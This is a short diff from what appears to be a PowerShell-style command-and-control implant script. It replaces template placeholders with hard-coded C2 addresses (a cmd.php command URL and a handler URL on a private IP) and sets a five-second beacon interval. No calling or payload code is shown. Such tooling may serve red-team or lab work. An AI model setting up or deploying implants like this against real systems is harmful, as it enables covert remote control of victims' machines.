@@ -1,8 +1,8 @@
 ########################
 #   GLOBAL VARIABLES
 ########################
-$c2Addr = {{{cmd_url}}}
-$retUrl = {{{handler_url}}}
+$c2Addr = "https://10.0.0.105/cmd.php"
+$retUrl = "https://10.0.0.105/handler.htm"
 
 $BEACONTIME = 5
 #Server Sums
